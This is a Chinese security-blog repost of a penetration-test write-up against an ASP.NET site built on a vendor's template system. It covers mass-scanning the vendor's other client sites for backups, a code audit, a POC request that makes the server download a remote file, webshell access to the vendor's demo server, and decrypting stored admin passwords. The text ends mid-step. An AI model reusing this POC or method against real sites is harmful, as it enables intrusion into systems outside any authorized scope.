---
title: 实战渗透之一个破站日一天
url: https://www.secpulse.com/archives/191740.html
source: 安全脉搏
date: 2022-11-22
fetch_date: 2025-10-03T23:22:47.786749
---

# 实战渗透之一个破站日一天

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 实战渗透之一个破站日一天

[内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)

[潇湘信安](https://www.secpulse.com/newpage/author?author_id=37983)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng3.png)

2022-11-21

20,575

|  |
| --- |
| **声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。  请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。 |

文章来源：先知社区（Bughunter）

原文地址：https://xz.aliyun.com/t/8375

**0x01 使用关键词得到目标源码**

某日上午接到临时安排对某公司进行渗透测试，此次渗透给的是一个主域名，并且也没有子域，打开了目标网站先对其进行一波信息收集

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001007.png)

中间件: IIS 8.5

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001012.png)

输入admin发现自动添加了/说明其目录存在，那么盲猜一波文件，login.aspx、default.aspx、main.aspx 等等

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001014.png)

最终在login.aspx下面发现后台登录页面，这不猜他一波弱口令？？一顿操作过后账号被锁

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001015.png)

熟悉的开局，既然如此只能尝试其他方法了。

在主页的html代码中发现了某处信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001016.png)

设计制作？根据后面的域名访问过去，是一个建站公司那么，入手点来了。

IIS8.5+ASP.NET+建站系统先扫一波备份文件：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001018.png)

400多条ip，这开发商还行。使用FOFA查询工具，批量导出

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001019.png)

然后我们来扫一下备份文件，这里推荐我B哥的扫描器，可以进行批量存活扫描和目录扫描。

```
https://github.com/broken5/WebAliveScan
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-16690010191.png)

在好几个站下面发现web.zip备份文件，下载下来过后，对其目标站点文件进行了对比，基本一致

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001021.png)

**0x02 拿到代码开始审计多次碰壁**

那么开始审计。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001024.png)

在某接口处发现敏感操作WebClient.DownloadFile (远程文件下载)，由于该方法需要提供绝对路径。。

比较头疼，但我跟踪相关参数发现，在另一个方法中调用了该方法。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001025.png)

并传入Server.MapPath，这根本不需要找绝对路径了，系统都给你安排好了，那么构造POC：

```
ashx/api.ashx?m=downloadfile&FilePath=asmx.jpg&WebUrl=http://***.cn/
```

‍

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001028.png)

访问地址：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-16690010281.png)

文件存在，那么证明可行，回到目标地址：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001029.png)

被修复了文件不存在，继续回到代码中，审计其他漏洞在其他接口中，也均存在多个漏洞，如ueditor远程抓取漏洞

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001030.png)

文件重命名可Getshell

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-16690010301.png)

但是这些接口都需要登录

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001031.png)

这就很头疼了，打算在一些无需登录的接口中尝试寻找SQL注入，最终在某处发现SQL拼接。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001032.png)

但是这里调用了IsSafeSqlString检测

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001033.png)

常见符号基本被卡的死死的

**0x03 拿下开发商寻找通用账号逆向加解密算法**

由于都是使用了相同的建站程序，怀疑有程序内置账户，于是准备通过刚才审计出来的漏洞从同程序的站点入手，最终在某个站点成功拿到Webshell，看了下相关信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001035.png)

居然是厂商的演示站群，存了该开发商所有站点源码。应该是在开发过程中的演示环境吧站点有很多，估计每个客户都有。

在服务器里翻到了目标站点的演示网站

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001036.png)

根目录下有zip网站备份和sql数据库备份，如果说目标站点是直接搬迁过去的，那么后台账户密码应该是一样的。

将其SQL文件下载下来，再其中搜索相关信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001038.png)

发现了插入账户的SQL语句，其密码是加密过的

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001042.png)

cmd5解不开，看了下密文是33位加密。

但是登录过程中，密码是RSA加密过后传输的，而后端居然是33位的md5加密

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001043.png)

因为有源代码，追踪了一下登录了相关方法。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-16690010431.png)

密码传入后，调用了CommFun.EnPwd进行了一次加密。追踪EnPwd方法

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001046.png)

可以看到，传入进来的密码是RSA类型，先进行了一次RSA解密，然后进行了一次DES加密。

追踪DESEncrypt.Encrypt方法。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001047.png)

这里是将Encrypt方法封装了一下，并传入加密key，其核心加密方法为下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001050.png)

并且，在该类里还定义了解密方法

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001055.png)

得到了加密方法和解密方法以及key，那么只需要将其单独拉出来调用就可以了。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001060.png)

将得到加密字符进行解密，得到结果

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001063.png)

尝试登录

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191740-1669001064.png)

忙...